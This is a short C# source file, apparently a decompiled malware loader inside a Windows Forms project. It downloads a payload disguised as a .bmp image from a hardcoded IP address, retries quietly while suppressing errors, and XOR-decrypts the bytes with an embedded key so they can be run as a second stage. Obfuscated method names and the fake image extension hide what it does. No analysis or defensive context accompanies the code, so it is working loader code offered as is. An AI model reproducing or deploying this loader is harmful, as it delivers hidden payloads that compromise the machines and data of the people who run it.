using System.IO;
using System.Net;
using System.Text;

namespace WindowsFormsApp23;

internal class Cook
{
	private static byte[] Dmprr(string url)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
		WebResponse response = httpWebRequest.GetResponse();
		MemoryStream memoryStream = new MemoryStream();
		response.GetResponseStream().CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	private static byte[] Foo()
	{
		return Dmprr("http://35.158.94.112/fixed/Dhtbsrf.bmp");
	}

	internal static byte[] Array()
	{
		for (int i = 0; i < 5; i++)
		{
			try
			{
				byte[] array = Foo();
				string s = "Qdewbmaahjxmx";
				byte[] bytes = Encoding.ASCII.GetBytes(s);
				byte[] array2 = new byte[array.Length];
				for (int j = 0; j < array.Length; j++)
				{
					array2[j] = (byte)(bytes[j % bytes.Length] ^ array[j]);
				}
				return array2;
			}
			catch
			{
			}
		}
		return null;
	}
}
